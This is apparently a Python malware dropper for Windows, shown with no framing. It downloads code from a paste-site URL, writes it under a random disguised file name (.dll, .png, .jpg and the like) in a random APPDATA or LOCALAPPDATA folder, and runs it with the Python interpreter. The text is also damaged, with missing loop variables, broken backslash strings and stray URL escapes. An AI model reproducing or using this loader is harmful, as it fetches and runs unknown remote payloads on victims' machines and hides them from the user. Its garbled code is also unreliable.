from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import webbrowser
import winreg
from random import choice
from shutil import copy
from os import getenv, listdir, startfile

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for  in range(10):
        chosen = choice(directory)
        ye = path + "\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for  in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("https://www.klgrth.io/paste/j2yvv/raw%22).read().decode(%22utf8%22))

def run(path):
    system(f"start {executable} {path}")


DoYouKnowTheWay = getPath() + '\' + getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)